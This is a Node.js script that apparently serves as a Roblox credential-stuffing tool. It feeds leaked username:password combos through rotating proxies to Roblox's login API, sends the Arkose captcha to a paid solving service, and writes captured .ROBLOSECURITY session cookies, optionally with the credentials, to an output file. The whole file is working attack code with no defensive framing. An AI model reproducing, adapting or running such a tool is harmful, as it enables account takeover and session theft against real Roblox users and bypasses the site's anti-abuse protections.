const THREAD_COUNT = 10;
const ANTICAPTCHA_KEY = 'ANTICAPTCHAKEY';
const LOGIN_ATTEMPT_COUNT = 5;
const UPC_FORMAT = false; // Save in U:P:C format instead of just Cookie

const request = require('request');
const fs = require("fs")

const proxies = fs.readFileSync("proxies.txt").toString().split("\n").map(v => v.trim());
const combo = fs.readFileSync("combo.txt").toString().split("\n").map(v => v.trim());

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function req(url, options) {
    return new Promise((resolve, reject) => {
        request(url, options, (err, res, body) => {
            if (err) {
                reject(err);
            } else {
                resolve([res, body]);
            }
        });
    });
}

let x = 0;
let w = 0
for (let y = 0; y < THREAD_COUNT; y++) {
    setTimeout(async () => {
        while (true) {
            const user = combo[x++];
            if (!user) return
            for (let z = 0; z < LOGIN_ATTEMPT_COUNT; z++) {
                try {
                    let proxy = proxies[w++ % proxies.length];
                    let [csrf] = await req("https://auth.roblox.com/v2/login", {
                        proxy: proxy,
                        method: "POST"
                    });
                    csrf = csrf.headers["x-csrf-token"]
                    let [res, body] = await req("https://auth.roblox.com/v2/login", {
                        proxy: proxy,
                        method: "POST",
                        headers: {
                            "x-csrf-token": csrf,
                            "content-type": "application/json"
                        },
                        json: {
                            cvalue: user.split(":")[0],
                            ctype: "Username",
                            password: user.split(":")[1],
                        }
                    });
                    let fieldData = JSON.parse(body.errors[0].fieldData);
                    let [res2, taskId] = await req("https://api.anti-captcha.com/createTask", {
                        json: {
                            clientKey: ANTICAPTCHA_KEY,
                            task: {
                                type: "FunCaptchaTaskProxyless",
                                websiteURL: "https://www.roblox.com/login",
                                websitePublicKey: "476068BF-9607-4799-B53D-966BE98E2B81",
                                funcaptchaApiJSSubdomain: "roblox-api.arkoselabs.com",
                                data: JSON.stringify({ blob: fieldData.dxBlob }),
                            }
                        }
                    })
                    taskId = taskId.taskId
                    if (!taskId) {
                        await sleep(5000);
                        continue
                    }

                    await sleep(10000)
                    let token = null
                    for (let x = 0; x < 10; x++) {
                        let [res3, body3] = await req("https://api.anti-captcha.com/getTaskResult", {
                            json: {
                                clientKey: ANTICAPTCHA_KEY,
                                taskId: taskId
                            }
                        })
                        if (body3.solution) {
                            token = body3.solution.token
                            break
                        }
                        await sleep(5000)
                    }
                    if (!token) continue

                    let [res4, body4] = await req("https://auth.roblox.com/v2/login", {
                        proxy: proxy,
                        method: "POST",
                        headers: {
                            "x-csrf-token": csrf,
                            "content-type": "application/json"
                        },
                        json: {
                            cvalue: user.split(":")[0],
                            ctype: "Username",
                            password: user.split(":")[1],
                            captchaToken: token,
                            captchaId: fieldData.unifiedCaptchaId,
                            captchaProvider: "PROVIDER_ARKOSE_LABS"
                        }
                    })

                    if (res4.headers["set-cookie"].some(v => v.includes(".ROBLOSECURITY"))) {
                        const cookie = res4.headers["set-cookie"].find(v => v.includes(".ROBLOSECURITY")).match(/\.ROBLOSECURITY=(.+?);/)[1]
                        if (UPC_FORMAT) {
                            fs.appendFileSync("output.txt", `${user.split(":")[0]}:${user.split(":")[1]}:${cookie}\n`)
                        } else {
                            fs.appendFileSync("output.txt", `${cookie}\n`)
                        }
                        break
                    }

                    if(!body4.user && body4.errors[0].code == 1) {
                        break
                    }
                } catch (e) { }
            }
        }
    }, y * 100);
}